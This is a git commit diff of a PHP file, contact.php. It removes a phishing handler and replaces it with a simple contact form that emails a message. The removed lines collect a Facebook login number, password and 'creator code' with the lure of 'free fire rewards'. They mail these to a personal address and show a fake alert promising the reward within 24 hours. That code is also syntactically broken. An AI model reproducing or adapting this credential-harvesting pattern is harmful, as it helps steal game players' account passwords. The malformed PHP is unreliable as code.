6ca0115064e5f5f736e79b90e6577cf833e264c0
krishyt <86037649+krishyt@users.noreply.github.com>
2021-06-18 08:57:03 +0000

    contact.php

--- contact.php
+++ contact.php
@@ -1,17 +1,5 @@
 <?php
-$facebooknumber = $_REQUEST['fb number'];
-$password = $_REQUEST['password'];
-$creatorcode = $_REQUEST['creator code'];
-
-if (empty($facebooknumber)  || empty($password)  || empty($creatorcode))
-{
-    echo "please fill all the fields";
-}
-else
-{
-    mail("patelkrishg2003@gmail.com", "free fire rewards", $facebooknumber ,$password , $creatorcode);
-    echo <script type='text/javascript'>alert('your reward wiil be set within 24 hours');
-    window.history.log(-1);
-    </script>; 
+if($_POST["message"]) {
+    mail("patelkrishg2003@gmail.com", "Form to email message", $_POST["message"], "From: an@email.address");
 }
 ?>
